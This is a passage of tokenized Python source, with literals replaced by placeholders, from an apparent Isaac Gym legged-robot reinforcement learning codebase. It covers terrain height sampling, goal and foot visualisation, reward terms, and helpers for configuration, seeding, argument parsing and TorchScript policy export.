( ) [ : self . num_envs ] <EOL> self . env_origins [ : , <NUM_LIT> ] = spacing * yy . flatten ( ) [ : self . num_envs ] <EOL> self . env_origins [ : , <NUM_LIT> ] = <NUM_LIT> <EOL> def _parse_cfg ( self , cfg ) : <EOL> self . dt = self . cfg . control . decimation * self . sim_params . dt <EOL> self . obs_scales = self . cfg . normalization . obs_scales <EOL> self . reward_scales = class_to_dict ( self . cfg . rewards . scales ) <EOL> reward_norm_factor = <NUM_LIT> <EOL> for rew in self . reward_scales : <EOL> self . reward_scales [ rew ] = self . reward_scales [ rew ] / reward_norm_factor <EOL> if self . cfg . commands . curriculum : <EOL> self . command_ranges = class_to_dict ( self . cfg . commands . ranges ) <EOL> else : <EOL> self . command_ranges = class_to_dict ( self . cfg . commands . max_ranges ) <EOL> if self . cfg . terrain . mesh_type not in [ '<STR_LIT>' , '<STR_LIT>' ] : <EOL> self . cfg . terrain . curriculum = False <EOL> self . max_episode_length_s = self . cfg . env . episode_length_s <EOL> self . max_episode_length = np . ceil ( self . max_episode_length_s / self . dt ) <EOL> self . cfg . domain_rand . push_interval = np . ceil ( self . cfg . domain_rand . push_interval_s / self . dt ) <EOL> def _draw_height_samples ( self ) : <EOL> if not self . terrain . cfg . measure_heights : <EOL> return <EOL> self . gym . refresh_rigid_body_state_tensor ( self . sim ) <EOL> sphere_geom = gymutil . WireframeSphereGeometry ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , None , color = ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) ) <EOL> i = self . lookat_id <EOL> base_pos = ( self . root_states [ i , : <NUM_LIT> ] ) . cpu ( ) . numpy ( ) <EOL> heights = self . measured_heights [ i ] . cpu ( ) . numpy ( ) <EOL> height_points = quat_apply_yaw ( self . base_quat [ i ] . repeat ( heights . shape [ <NUM_LIT> ] ) , self . height_points [ i ] ) . cpu ( ) . numpy ( ) <EOL> for j in range ( heights . shape [ <NUM_LIT> ] ) : <EOL> x = height_points [ j , <NUM_LIT> ] + base_pos [ <NUM_LIT> ] <EOL> y = height_points [ j , <NUM_LIT> ] + base_pos [ <NUM_LIT> ] <EOL> z = heights [ j ] <EOL> sphere_pose = gymapi . Transform ( gymapi . Vec3 ( x , y , z ) , r = None ) <EOL> gymutil . draw_lines ( sphere_geom , self . gym , self . viewer , self . envs [ i ] , sphere_pose ) <EOL> def _draw_goals ( self ) : <EOL> sphere_geom = gymutil . WireframeSphereGeometry ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , None , color = ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) ) <EOL> sphere_geom_cur = gymutil . WireframeSphereGeometry ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , None , color = ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) ) <EOL> sphere_geom_reached = gymutil . WireframeSphereGeometry ( self . cfg . env . next_goal_threshold , <NUM_LIT> , <NUM_LIT> , None , color = ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) ) <EOL> goals = self . terrain_goals [ self . terrain_levels [ self . lookat_id ] , self . terrain_types [ self . lookat_id ] ] . cpu ( ) . numpy ( ) <EOL> for i , goal in enumerate ( goals ) : <EOL> goal_xy = goal [ : <NUM_LIT> ] + self . terrain . cfg . border_size <EOL> pts = ( goal_xy / self . terrain . cfg . horizontal_scale ) . astype ( int ) <EOL> goal_z = self . height_samples [ pts [ <NUM_LIT> ] , pts [ <NUM_LIT> ] ] . cpu ( ) . item ( ) * self . terrain . cfg . vertical_scale <EOL> pose = gymapi . Transform ( gymapi . Vec3 ( goal [ <NUM_LIT> ] , goal [ <NUM_LIT> ] , goal_z ) , r = None ) <EOL> if i == self . cur_goal_idx [ self . lookat_id ] . cpu ( ) . item ( ) : <EOL> gymutil . draw_lines ( sphere_geom_cur , self . gym , self . viewer , self . envs [ self . lookat_id ] , pose ) <EOL> if self . reached_goal_ids [ self . lookat_id ] : <EOL> gymutil . draw_lines ( sphere_geom_reached , self . gym , self . viewer , self . envs [ self . lookat_id ] , pose ) <EOL> else : <EOL> gymutil . draw_lines ( sphere_geom , self . gym , self . viewer , self . envs [ self . lookat_id ] , pose ) <EOL> if not self . cfg . depth . use_camera : <EOL> sphere_geom_arrow = gymutil . WireframeSphereGeometry ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , None , color = ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) ) <EOL> pose_robot = self . root_states [ self . lookat_id , : <NUM_LIT> ] . cpu ( ) . numpy ( ) <EOL> for i in range ( <NUM_LIT> ) : <EOL> norm = torch . norm ( self . target_pos_rel , dim = - <NUM_LIT> , keepdim = True ) <EOL> target_vec_norm = self . target_pos_rel / ( norm + <NUM_LIT> ) <EOL> pose_arrow = pose_robot [ : <NUM_LIT> ] + <NUM_LIT> * ( i + <NUM_LIT> ) * target_vec_norm [ self . lookat_id , : <NUM_LIT> ] . cpu ( ) . numpy ( ) <EOL> pose = gymapi . Transform ( gymapi . Vec3 ( pose_arrow [ <NUM_LIT> ] , pose_arrow [ <NUM_LIT> ] , pose_robot [ <NUM_LIT> ] ) , r = None ) <EOL> gymutil . draw_lines ( sphere_geom_arrow , self . gym , self . viewer , self . envs [ self . lookat_id ] , pose ) <EOL> sphere_geom_arrow = gymutil . WireframeSphereGeometry ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , None , color = ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) ) <EOL> for i in range ( <NUM_LIT> ) : <EOL> norm = torch . norm ( self . next_target_pos_rel , dim = - <NUM_LIT> , keepdim = True ) <EOL> target_vec_norm = self . next_target_pos_rel / ( norm + <NUM_LIT> ) <EOL> pose_arrow = pose_robot [ : <NUM_LIT> ] + <NUM_LIT> * ( i + <NUM_LIT> ) * target_vec_norm [ self . lookat_id , : <NUM_LIT> ] . cpu ( ) . numpy ( ) <EOL> pose = gymapi . Transform ( gymapi . Vec3 ( pose_arrow [ <NUM_LIT> ] , pose_arrow [ <NUM_LIT> ] , pose_robot [ <NUM_LIT> ] ) , r = None ) <EOL> gymutil . draw_lines ( sphere_geom_arrow , self . gym , self . viewer , self . envs [ self . lookat_id ] , pose ) <EOL> def _draw_feet ( self ) : <EOL> if hasattr ( self , '<STR_LIT>' ) : <EOL> non_edge_geom = gymutil . WireframeSphereGeometry ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , None , color = ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) ) <EOL> edge_geom = gymutil . WireframeSphereGeometry ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , None , color = ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) ) <EOL> feet_pos = self . rigid_body_states [ : , self . feet_indices , : <NUM_LIT> ] <EOL> for i in range ( <NUM_LIT> ) : <EOL> pose = gymapi . Transform ( gymapi . Vec3 ( feet_pos [ self . lookat_id , i , <NUM_LIT> ] , feet_pos [ self . lookat_id , i , <NUM_LIT> ] , feet_pos [ self . lookat_id , i , <NUM_LIT> ] ) , r = None ) <EOL> if self . feet_at_edge [ self . lookat_id , i ] : <EOL> gymutil . draw_lines ( edge_geom , self . gym , self . viewer , self . envs [ i ] , pose ) <EOL> else : <EOL> gymutil . draw_lines ( non_edge_geom , self . gym , self . viewer , self . envs [ i ] , pose ) <EOL> def _init_height_points ( self ) : <EOL> y = torch . tensor ( self . cfg . terrain . measured_points_y , device = self . device , requires_grad = False ) <EOL> x = torch . tensor ( self . cfg . terrain . measured_points_x , device = self . device , requires_grad = False ) <EOL> grid_x , grid_y = torch . meshgrid ( x , y ) <EOL> self . num_height_points = grid_x . numel ( ) <EOL> points = torch . zeros ( self . num_envs , self . num_height_points , <NUM_LIT> , device = self . device , requires_grad = False ) <EOL> for i in range ( self . num_envs ) : <EOL> offset = torch_rand_float ( - self . cfg . terrain . measure_horizontal_noise , self . cfg . terrain . measure_horizontal_noise , ( self . num_height_points , <NUM_LIT> ) , device = self . device ) . squeeze ( ) <EOL> xy_noise = torch_rand_float ( - self . cfg . terrain . measure_horizontal_noise , self . cfg . terrain . measure_horizontal_noise , ( self . num_height_points , <NUM_LIT> ) , device = self . device ) . squeeze ( ) + offset <EOL> points [ i , : , <NUM_LIT> ] = grid_x . flatten ( ) + xy_noise [ : , <NUM_LIT> ] <EOL> points [ i , : , <NUM_LIT> ] = grid_y . flatten ( ) + xy_noise [ : , <NUM_LIT> ] <EOL> return points <EOL> def get_foot_contacts ( self ) : <EOL> foot_contacts_bool = self . contact_forces [ : , self . feet_indices , <NUM_LIT> ] > <NUM_LIT> <EOL> if self . cfg . env . include_foot_contacts : <EOL> return foot_contacts_bool <EOL> else : <EOL> return torch . zeros_like ( foot_contacts_bool ) . to ( self . device ) <EOL> def _get_heights ( self , env_ids = None ) : <EOL> if self . cfg . terrain . mesh_type == '<STR_LIT>' : <EOL> return torch . zeros ( self . num_envs , self . num_height_points , device = self . device , requires_grad = False ) <EOL> elif self . cfg . terrain . mesh_type == '<STR_LIT>' : <EOL> raise NameError ( "<STR_LIT>" ) <EOL> if env_ids : <EOL> points = quat_apply_yaw ( self . base_quat [ env_ids ] . repeat ( <NUM_LIT> , self . num_height_points ) , self . height_points [ env_ids ] ) + ( self . root_states [ env_ids , : <NUM_LIT> ] ) . unsqueeze ( <NUM_LIT> ) <EOL> else : <EOL> points = quat_apply_yaw ( self . base_quat . repeat ( <NUM_LIT> , self . num_height_points ) , self . height_points ) + ( self . root_states [ : , : <NUM_LIT> ] ) . unsqueeze ( <NUM_LIT> ) <EOL> points += self . terrain . cfg . border_size <EOL> points = ( points / self . terrain . cfg . horizontal_scale ) . long ( ) <EOL> px = points [ : , : , <NUM_LIT> ] . view ( - <NUM_LIT> ) <EOL> py = points [ : , : , <NUM_LIT> ] . view ( - <NUM_LIT> ) <EOL> px = torch . clip ( px , <NUM_LIT> , self . height_samples . shape [ <NUM_LIT> ] - <NUM_LIT> ) <EOL> py = torch . clip ( py , <NUM_LIT> , self . height_samples . shape [ <NUM_LIT> ] - <NUM_LIT> ) <EOL> heights1 = self . height_samples [ px , py ] <EOL> heights2 = self . height_samples [ px + <NUM_LIT> , py ] <EOL> heights3 = self . height_samples [ px , py + <NUM_LIT> ] <EOL> heights = torch . min ( heights1 , heights2 ) <EOL> heights = torch . min ( heights , heights3 ) <EOL> return heights . view ( self . num_envs , - <NUM_LIT> ) * self . terrain . cfg . vertical_scale <EOL> def _get_heights_points ( self , coords , env_ids = None ) : <EOL> if env_ids : <EOL> points = coords [ env_ids ] <EOL> else : <EOL> points = coords <EOL> points = ( points / self . terrain . cfg . horizontal_scale ) . long ( ) <EOL> px = points [ : , : , <NUM_LIT> ] . view ( - <NUM_LIT> ) <EOL> py = points [ : , : , <NUM_LIT> ] . view ( - <NUM_LIT> ) <EOL> px = torch . clip ( px , <NUM_LIT> , self . height_samples . shape [ <NUM_LIT> ] - <NUM_LIT> ) <EOL> py = torch . clip ( py , <NUM_LIT> , self . height_samples . shape [ <NUM_LIT> ] - <NUM_LIT> ) <EOL> heights1 = self . height_samples [ px , py ] <EOL> heights2 = self . height_samples [ px + <NUM_LIT> , py ] <EOL> heights3 = self . height_samples [ px , py + <NUM_LIT> ] <EOL> heights = torch . min ( heights1 , heights2 ) <EOL> heights = torch . min ( heights , heights3 ) <EOL> return heights . view ( self . num_envs , - <NUM_LIT> ) * self . terrain . cfg . vertical_scale <EOL> def _reward_tracking_goal_vel ( self ) : <EOL> norm = torch . norm ( self . target_pos_rel , dim = - <NUM_LIT> , keepdim = True ) <EOL> target_vec_norm = self . target_pos_rel / ( norm + <NUM_LIT> ) <EOL> cur_vel = self . root_states [ : , <NUM_LIT> : <NUM_LIT> ] <EOL> rew = torch . minimum ( torch . sum ( target_vec_norm * cur_vel , dim = - <NUM_LIT> ) , self . commands [ : , <NUM_LIT> ] ) / ( self . commands [ : , <NUM_LIT> ] + <NUM_LIT> ) <EOL> return rew <EOL> def _reward_tracking_yaw ( self ) : <EOL> rew = torch . exp ( - torch . abs ( self . target_yaw - self . yaw ) ) <EOL> return rew <EOL> def _reward_lin_vel_z ( self ) : <EOL> rew = torch . square ( self . base_lin_vel [ : , <NUM_LIT> ] ) <EOL> rew [ self . env_class != <NUM_LIT> ] *= <NUM_LIT> <EOL> return rew <EOL> def _reward_ang_vel_xy ( self ) : <EOL> return torch . sum ( torch . square ( self . base_ang_vel [ : , : <NUM_LIT> ] ) , dim = <NUM_LIT> ) <EOL> def _reward_orientation ( self ) : <EOL> rew = torch . sum ( torch . square ( self . projected_gravity [ : , : <NUM_LIT> ] ) , dim = <NUM_LIT> ) <EOL> rew [ self . env_class != <NUM_LIT> ] = <NUM_LIT> <EOL> return rew <EOL> def _reward_dof_acc ( self ) : <EOL> return torch . sum ( torch . square ( ( self . last_dof_vel - self . dof_vel ) / self . dt ) , dim = <NUM_LIT> ) <EOL> def _reward_collision ( self ) : <EOL> return torch . sum ( <NUM_LIT> * ( torch . norm ( self . contact_forces [ : , self . penalised_contact_indices , : ] , dim = - <NUM_LIT> ) > <NUM_LIT> ) , dim = <NUM_LIT> ) <EOL> def _reward_action_rate ( self ) : <EOL> return torch . norm ( self . last_actions - self . actions , dim = <NUM_LIT> ) <EOL> def _reward_delta_torques ( self ) : <EOL> return torch . sum ( torch . square ( self . torques - self . last_torques ) , dim = <NUM_LIT> ) <EOL> def _reward_torques ( self ) : <EOL> return torch . sum ( torch . square ( self . torques ) , dim = <NUM_LIT> ) <EOL> def _reward_hip_pos ( self ) : <EOL> return torch . sum ( torch . square ( self . dof_pos [ : , self . hip_indices ] - self . default_dof_pos [ : , self . hip_indices ] ) , dim = <NUM_LIT> ) <EOL> def _reward_dof_error ( self ) : <EOL> dof_error = torch . sum ( torch . square ( self . dof_pos - self . default_dof_pos ) , dim = <NUM_LIT> ) <EOL> return dof_error <EOL> def _reward_feet_stumble ( self ) : <EOL> rew = torch . any ( torch . norm ( self . contact_forces [ : , self . feet_indices , : <NUM_LIT> ] , dim = <NUM_LIT> ) > <NUM_LIT> * torch . abs ( self . contact_forces [ : , self . feet_indices , <NUM_LIT> ] ) , dim = <NUM_LIT> ) <EOL> return rew . float ( ) <EOL> def _reward_feet_edge ( self ) : <EOL> feet_pos_xy = ( ( self . rigid_body_states [ : , self . feet_indices , : <NUM_LIT> ] + self . terrain . cfg . border_size ) / self . cfg . terrain . horizontal_scale ) . round ( ) . long ( ) <EOL> feet_pos_xy [ ... , <NUM_LIT> ] = torch . clip ( feet_pos_xy [ ... , <NUM_LIT> ] , <NUM_LIT> , self . x_edge_mask . shape [ <NUM_LIT> ] - <NUM_LIT> ) <EOL> feet_pos_xy [ ... , <NUM_LIT> ] = torch . clip ( feet_pos_xy [ ... , <NUM_LIT> ] , <NUM_LIT> , self . x_edge_mask . shape [ <NUM_LIT> ] - <NUM_LIT> ) <EOL> feet_at_edge = self . x_edge_mask [ feet_pos_xy [ ... , <NUM_LIT> ] , feet_pos_xy [ ... , <NUM_LIT> ] ] <EOL> self . feet_at_edge = self . contact_filt & feet_at_edge <EOL> rew = ( self . terrain_levels > <NUM_LIT> ) * torch . sum ( self . feet_at_edge , dim = - <NUM_LIT> ) <EOL> return rew <EOL> </s>
<s> import os <EOL> import copy <EOL> import torch <EOL> import numpy as np <EOL> import random <EOL> from isaacgym import gymapi <EOL> from isaacgym import gymutil <EOL> import argparse <EOL> from legged_gym import LEGGED_GYM_ROOT_DIR , LEGGED_GYM_ENVS_DIR <EOL> def class_to_dict ( obj ) -> dict : <EOL> if not hasattr ( obj , "<STR_LIT>" ) : <EOL> return obj <EOL> result = { } <EOL> for key in dir ( obj ) : <EOL> if key . startswith ( "<STR_LIT>" ) : <EOL> continue <EOL> element = [ ] <EOL> val = getattr ( obj , key ) <EOL> if isinstance ( val , list ) : <EOL> for item in val : <EOL> element . append ( class_to_dict ( item ) ) <EOL> else : <EOL> element = class_to_dict ( val ) <EOL> result [ key ] = element <EOL> return result <EOL> def update_class_from_dict ( obj , dict ) : <EOL> for key , val in dict . items ( ) : <EOL> attr = getattr ( obj , key , None ) <EOL> if isinstance ( attr , type ) : <EOL> update_class_from_dict ( attr , val ) <EOL> else : <EOL> setattr ( obj , key , val ) <EOL> return <EOL> def set_seed ( seed ) : <EOL> if seed == - <NUM_LIT> : <EOL> seed = np . random . randint ( <NUM_LIT> , <NUM_LIT> ) <EOL> print ( "<STR_LIT>" . format ( seed ) ) <EOL> random . seed ( seed ) <EOL> np . random . seed ( seed ) <EOL> torch . manual_seed ( seed ) <EOL> os . environ [ '<STR_LIT>' ] = str ( seed ) <EOL> torch . cuda . manual_seed ( seed ) <EOL> torch . cuda . manual_seed_all ( seed ) <EOL> def parse_sim_params ( args , cfg ) : <EOL> sim_params = gymapi . SimParams ( ) <EOL> if args . physics_engine == gymapi . SIM_FLEX : <EOL> if args . device != "<STR_LIT>" : <EOL> print ( "<STR_LIT>" ) <EOL> elif args . physics_engine == gymapi . SIM_PHYSX : <EOL> sim_params . physx . use_gpu = args . use_gpu <EOL> sim_params . physx . num_subscenes = args . subscenes <EOL> sim_params . use_gpu_pipeline = args . use_gpu_pipeline <EOL> if "<STR_LIT>" in cfg : <EOL> gymutil . parse_sim_config ( cfg [ "<STR_LIT>" ] , sim_params ) <EOL> if args . physics_engine == gymapi . SIM_PHYSX and args . num_threads > <NUM_LIT> : <EOL> sim_params . physx . num_threads = args . num_threads <EOL> return sim_params <EOL> def get_load_path ( root , load_run = - <NUM_LIT> , checkpoint = - <NUM_LIT> , model_name_include = "<STR_LIT>" ) : <EOL> if not os . path . isdir ( root ) : <EOL> model_name_cand = os . path . basename ( root ) <EOL> model_parent = os . path . dirname ( root ) <EOL> model_names = os . listdir ( model_parent ) <EOL> model_names = [ name for name in model_names if os . path . isdir ( os . path . join ( model_parent , name ) ) ] <EOL> for name in model_names : <EOL> if len ( name ) >= <NUM_LIT> : <EOL> if name [ : <NUM_LIT> ] == model_name_cand : <EOL> root = os . path . join ( model_parent , name ) <EOL> if checkpoint == - <NUM_LIT> : <EOL> models = [ file for file in os . listdir ( root ) if model_name_include in file ] <EOL> models . sort ( key = lambda m : '<STR_LIT>' . format ( m ) ) <EOL> model = models [ - <NUM_LIT> ] <EOL> else : <EOL> model = "<STR_LIT>" . format ( checkpoint ) <EOL> load_path = os . path . join ( root , model ) <EOL> return load_path <EOL> def update_cfg_from_args ( env_cfg , cfg_train , args ) : <EOL> if env_cfg is not None : <EOL> if args . use_camera : <EOL> env_cfg . depth . use_camera = args . use_camera <EOL> if env_cfg . depth . use_camera and args . headless : <EOL> env_cfg . env . num_envs = env_cfg . depth . camera_num_envs <EOL> env_cfg . terrain . num_rows = env_cfg . depth . camera_terrain_num_rows <EOL> env_cfg . terrain . num_cols = env_cfg . depth . camera_terrain_num_cols <EOL> env_cfg . terrain . max_error = env_cfg . terrain . max_error_camera <EOL> env_cfg . terrain . horizontal_scale = env_cfg . terrain . horizontal_scale_camera <EOL> env_cfg . terrain . simplify_grid = True <EOL> env_cfg . terrain . terrain_dict [ "<STR_LIT>" ] = <NUM_LIT> <EOL> env_cfg . terrain . terrain_dict [ "<STR_LIT>" ] = <NUM_LIT> <EOL> env_cfg . terrain . terrain_dict [ "<STR_LIT>" ] = <NUM_LIT> <EOL> env_cfg . terrain . terrain_dict [ "<STR_LIT>" ] = <NUM_LIT> <EOL> env_cfg . terrain . terrain_dict [ "<STR_LIT>" ] = <NUM_LIT> <EOL> env_cfg . terrain . terrain_proportions = list ( env_cfg . terrain . terrain_dict . values ( ) ) <EOL> if env_cfg . depth . use_camera : <EOL> env_cfg . terrain . y_range = [ - <NUM_LIT> , <NUM_LIT> ] <EOL> if args . num_envs is not None : <EOL> env_cfg . env . num_envs = args . num_envs <EOL> if args . seed is not None : <EOL> env_cfg . seed = args . seed <EOL> if args . task_both : <EOL> env_cfg . env . task_both = args . task_both <EOL> if args . rows is not None : <EOL> env_cfg . terrain . num_rows = args . rows <EOL> if args . cols is not None : <EOL> env_cfg . terrain . num_cols = args . cols <EOL> if args . delay : <EOL> env_cfg . domain_rand . action_delay = args . delay <EOL> if not args . delay and not args . resume and not args . use_camera and args . headless : <EOL> env_cfg . domain_rand . action_delay = True <EOL> env_cfg . domain_rand . action_curr_step = env_cfg . domain_rand . action_curr_step_scratch <EOL> if cfg_train is not None : <EOL> if args . seed is not None : <EOL> cfg_train . seed = args . seed <EOL> if args . use_camera : <EOL> cfg_train . depth_encoder . if_depth = args . use_camera <EOL> if args . max_iterations is not None : <EOL> cfg_train . runner . max_iterations = args . max_iterations <EOL> if args . resume : <EOL> cfg_train . runner . resume = args . resume <EOL> cfg_train . algorithm . priv_reg_coef_schedual = cfg_train . algorithm . priv_reg_coef_schedual_resume <EOL> if args . experiment_name is not None : <EOL> cfg_train . runner . experiment_name = args . experiment_name <EOL> if args . run_name is not None : <EOL> cfg_train . runner . run_name = args . run_name <EOL> if args . load_run is not None : <EOL> cfg_train . runner . load_run = args . load_run <EOL> if args . checkpoint is not None : <EOL> cfg_train . runner . checkpoint = args . checkpoint <EOL> return env_cfg , cfg_train <EOL> def get_args ( ) : <EOL> custom_parameters = [ <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : str , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : str , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : str , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : str , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : int , "<STR_LIT>" : - <NUM_LIT> , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : str , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : '<STR_LIT>' } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : int , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : int , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : int , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : str , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : '<STR_LIT>' } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : int , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : int , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : str , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : str , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : str , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : str , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : str , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : str , "<STR_LIT>" : None , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" } <EOL> ] <EOL> args = parse_arguments ( <EOL> description = "<STR_LIT>" , <EOL> custom_parameters = custom_parameters ) <EOL> args . sim_device_id = args . compute_device_id <EOL> args . sim_device = args . sim_device_type <EOL> if args . sim_device == '<STR_LIT>' : <EOL> args . sim_device += f"<STR_LIT>" <EOL> return args <EOL> def export_policy_as_jit ( actor_critic , path , name ) : <EOL> if hasattr ( actor_critic , '<STR_LIT>' ) : <EOL> exporter = PolicyExporterLSTM ( actor_critic ) <EOL> exporter . export ( path ) <EOL> else : <EOL> os . makedirs ( path , exist_ok = True ) <EOL> path = os . path . join ( path , name + "<STR_LIT>" ) <EOL> model = copy . deepcopy ( actor_critic . actor ) . to ( '<STR_LIT>' ) <EOL> traced_script_module = torch . jit . script ( model ) <EOL> traced_script_module . save ( path ) <EOL> class PolicyExporterLSTM ( torch . nn . Module ) : <EOL> def __init__ ( self , actor_critic ) : <EOL> super ( ) . __init__ ( ) <EOL> self . actor = copy . deepcopy ( actor_critic . actor ) <EOL> self . is_recurrent = actor_critic . is_recurrent <EOL> self . memory = copy . deepcopy ( actor_critic . memory_a . rnn ) <EOL> self . memory . cpu ( ) <EOL> self . register_buffer ( f'<STR_LIT>' , torch . zeros ( self . memory . num_layers , <NUM_LIT> , self . memory . hidden_size ) ) <EOL> self . register_buffer ( f'<STR_LIT>' , torch . zeros ( self . memory . num_layers , <NUM_LIT> , self . memory . hidden_size ) ) <EOL> def forward ( self , x ) : <EOL> out , ( h , c ) = self . memory ( x . unsqueeze ( <NUM_LIT> ) , ( self . hidden_state , self . cell_state ) ) <EOL> self . hidden_state [ : ] = h <EOL> self . cell_state [ : ] = c <EOL> return self . actor ( out . squeeze ( <NUM_LIT> ) ) <EOL> @ torch . jit . export <EOL> def reset_memory ( self ) : <EOL> self . hidden_state [ : ] = <NUM_LIT> <EOL> self . cell_state [ : ] = <NUM_LIT> <EOL> def export ( self , path ) : <EOL> os . makedirs ( path , exist_ok = True ) <EOL> path = os . path . join ( path , '<STR_LIT>' ) <EOL> self . to ( '<STR_LIT>' ) <EOL> traced_script_module = torch . jit . script ( self ) <EOL> traced_script_module . save ( path ) <EOL> def parse_device_str ( device_str ) : <EOL> device = '<STR_LIT>' <EOL> device_id = <NUM_LIT> <EOL> if device_str == '<STR_LIT>' or device_str == '<STR_LIT>' : <EOL> device = device_str <EOL> device_id = <NUM_LIT> <EOL> else : <EOL> device_args = device_str . split ( '<STR_LIT>' ) <EOL> assert len ( device_args ) == <NUM_LIT> and device_args [ <NUM_LIT> ] == '<STR_LIT>' , f'<STR_LIT>' <EOL> device , device_id_s = device_args <EOL> try : <EOL> device_id = int ( device_id_s ) <EOL> except ValueError : <EOL> raise ValueError ( f'<STR_LIT>' ) <EOL> return device , device_id <EOL> def parse_arguments ( description = "<STR_LIT>" , headless = False , no_graphics = False , custom_parameters = [ ] ) : <EOL> parser = argparse . ArgumentParser ( description = description ) <EOL> if headless : <EOL> parser . add_argument ( '<STR_LIT>' , action = '<STR_LIT>' , help = '<STR_LIT>' ) <EOL> if no_graphics : <EOL> parser . add_argument ( '<STR_LIT>' , action = '<STR_LIT>' , <EOL> help = '<STR_LIT>' ) <EOL> parser . add_argument ( '<STR_LIT>' , type = str , default = "<STR_LIT>" , help = '<STR_LIT>' ) <EOL> parser . add_argument ( '<STR_LIT>' , type = str , default = "<STR_LIT>" , help = '<STR_LIT>' ) <EOL> parser . add_argument ( '<STR_LIT>' , type = int , default = <NUM_LIT> , help = 